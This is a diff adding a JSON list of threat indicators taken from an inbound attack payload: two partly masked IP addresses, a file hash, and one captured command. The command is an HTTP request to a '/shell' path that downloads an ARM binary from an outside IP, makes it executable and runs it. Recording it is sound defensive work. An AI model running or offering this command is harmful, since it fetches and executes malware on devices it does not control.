@@ -1,0 +1,26 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190.179.168.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "94.154.43.XXX"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "6edd24171fe2fe222a65e5edc6d4313de30f7f2e90676d58a2b316118cdb1d55"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\\/94.154.43.XXX/arm7;chmod+777+arm7;./arm7 HTTP/1.1"
+  }
+]
